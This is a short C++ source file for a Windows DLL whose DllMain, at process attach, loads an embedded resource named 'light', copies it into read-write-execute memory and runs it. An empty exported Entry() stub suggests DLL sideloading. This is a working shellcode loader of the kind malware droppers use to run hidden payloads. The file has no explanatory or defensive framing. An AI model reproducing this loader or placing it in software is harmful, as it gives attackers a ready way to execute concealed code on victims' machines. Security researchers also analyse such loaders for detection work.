#include <windows.h>
#include "stdafx.h"
#include "resource.h"
#include <iostream>

extern "C" __declspec(dllexport) void Entry() {

}

struct Parameters {
	std::size_t size_bytes = 0;
	void* ptr = NULL;
};


BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH: {
		
		HRSRC hResource = NULL;
		HGLOBAL hMemory = NULL;

		Parameters p;

		hResource = FindResource(hModule, MAKEINTRESOURCE(IDR_LIGHT1), L"light");
		hMemory = LoadResource(hModule, hResource);

		if (hMemory != NULL) {

			p.size_bytes = SizeofResource(hModule, hResource);
			p.ptr = LockResource(hMemory);
			if (p.ptr != NULL) {

				void * exec = VirtualAlloc(0, p.size_bytes, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
				memcpy(exec, p.ptr, p.size_bytes);
				
				((void(*)())exec)();
			}
		}

		
		break;
	}
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}


	return TRUE;
}

